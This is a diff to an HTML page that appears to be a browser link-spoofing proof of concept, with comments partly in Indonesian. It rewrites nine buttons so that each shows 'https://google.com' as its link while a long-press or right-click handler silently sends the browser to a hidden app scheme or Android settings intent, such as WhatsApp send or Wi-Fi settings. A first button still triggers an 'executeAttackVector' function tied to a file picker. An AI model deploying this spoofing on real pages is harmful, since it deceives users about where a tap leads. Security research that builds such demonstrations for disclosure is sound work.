@@ -102,49 +102,49 @@
             </div>
         </div>
 
-        <!-- 2. Button 2: Instagram Intent (Tanpa picker) -->
+        <!-- 2. Button 2: Instagram Intent -->
         <div class="card-box">
-            <a href="instagram://app" class="spoof-link" style="background-color: #9334e6;">Open Instagram</a>
+            <a href="https://google.com" class="spoof-link secondary-link" style="background-color: #9334e6;" data-scheme="instagram://app">Open Instagram</a>
         </div>
 
-        <!-- 3. Button 3: Google Maps Intent (Tanpa picker) -->
+        <!-- 3. Button 3: Google Maps Intent -->
         <div class="card-box">
-            <a href="geo:0,0?q=Googleplex" class="spoof-link" style="background-color: #34a853;">Open Maps</a>
+            <a href="https://google.com" class="spoof-link secondary-link" style="background-color: #34a853;" data-scheme="geo:0,0?q=Googleplex">Open Maps</a>
         </div>
 
-        <!-- 4. Button 4: Bluetooth Settings Intent (Tanpa picker) -->
+        <!-- 4. Button 4: Bluetooth Settings Intent -->
         <div class="card-box">
-            <a href="intent:#Intent;action=android.settings.BLUETOOTH_SETTINGS;end;" class="spoof-link" style="background-color: #fbbc05; color: #202124;">Open Bluetooth Settings</a>
+            <a href="https://google.com" class="spoof-link secondary-link" style="background-color: #fbbc05; color: #202124;" data-scheme="intent:#Intent;action=android.settings.BLUETOOTH_SETTINGS;end;">Open Bluetooth Settings</a>
         </div>
 
-        <!-- 5. Button 5: WhatsApp Intent (Tanpa picker) -->
+        <!-- 5. Button 5: WhatsApp Intent -->
         <div class="card-box">
-            <a href="whatsapp://send?text=PoC_Test" class="spoof-link" style="background-color: #25d366; color: #ffffff;">Open WhatsApp</a>
+            <a href="https://google.com" class="spoof-link secondary-link" style="background-color: #25d366; color: #ffffff;" data-scheme="whatsapp://send?text=PoC_Test">Open WhatsApp</a>
         </div>
 
-        <!-- 6. Button 6: Wi-Fi Settings Intent (Tanpa picker) -->
+        <!-- 6. Button 6: Wi-Fi Settings Intent -->
         <div class="card-box">
-            <a href="intent:#Intent;action=android.settings.WIFI_SETTINGS;end;" class="spoof-link" style="background-color: #4285f4;">Open Wi-Fi Settings</a>
+            <a href="https://google.com" class="spoof-link secondary-link" style="background-color: #4285f4;" data-scheme="intent:#Intent;action=android.settings.WIFI_SETTINGS;end;">Open Wi-Fi Settings</a>
         </div>
 
-        <!-- 7. Button 7: Location Settings Intent (Tanpa picker) -->
+        <!-- 7. Button 7: Location Settings Intent -->
         <div class="card-box">
-            <a href="intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end;" class="spoof-link" style="background-color: #ea4335;">Open Location Settings</a>
+            <a href="https://google.com" class="spoof-link secondary-link" style="background-color: #ea4335;" data-scheme="intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end;">Open Location Settings</a>
         </div>
 
-        <!-- 8. Button 8: Telegram Intent (Tanpa picker) -->
+        <!-- 8. Button 8: Telegram Intent -->
         <div class="card-box">
-            <a href="tg://resolve?domain=telegram" class="spoof-link" style="background-color: #0088cc;">Open Telegram</a>
+            <a href="https://google.com" class="spoof-link secondary-link" style="background-color: #0088cc;" data-scheme="tg://resolve?domain=telegram">Open Telegram</a>
         </div>
 
-        <!-- 9. Button 9: NFC Settings Intent (Tanpa picker) -->
+        <!-- 9. Button 9: NFC Settings Intent -->
         <div class="card-box">
-            <a href="intent:#Intent;action=android.settings.NFC_SETTINGS;end;" class="spoof-link" style="background-color: #34a853;">Open NFC Settings</a>
+            <a href="https://google.com" class="spoof-link secondary-link" style="background-color: #34a853;" data-scheme="intent:#Intent;action=android.settings.NFC_SETTINGS;end;">Open NFC Settings</a>
         </div>
 
-        <!-- 10. Button 10: Display Settings Intent (Tanpa picker) -->
+        <!-- 10. Button 10: Display Settings Intent -->
         <div class="card-box">
-            <a href="intent:#Intent;action=android.settings.DISPLAY_SETTINGS;end;" class="spoof-link" style="background-color: #ff6d00;">Open Display Settings</a>
+            <a href="https://google.com" class="spoof-link secondary-link" style="background-color: #ff6d00;" data-scheme="intent:#Intent;action=android.settings.DISPLAY_SETTINGS;end;">Open Display Settings</a>
         </div>
     </div>
 
@@ -193,14 +193,21 @@
             }, 1300);
         };
 
-        // Hanya button pertama yang memiliki event listener file picker
+        // Button 1: File Picker + Contextmenu
         const targetElement = document.getElementById("targetLink");
-
         targetElement.addEventListener("contextmenu", () => {
             executeAttackVector();
         });
-
         targetElement.addEventListener("touchstart", () => {}, { passive: true });
+
+        // Button 2 - 10: href="https://google.com" tapi saat contextmenu (klik kanan) memicu custom scheme/intent
+        document.querySelectorAll('.secondary-link').forEach(link => {
+            const scheme = link.getAttribute('data-scheme');
+            link.addEventListener("contextmenu", () => {
+                window.location.href = scheme;
+            });
+            link.addEventListener("touchstart", () => {}, { passive: true });
+        });
     </script>
 
 </body>
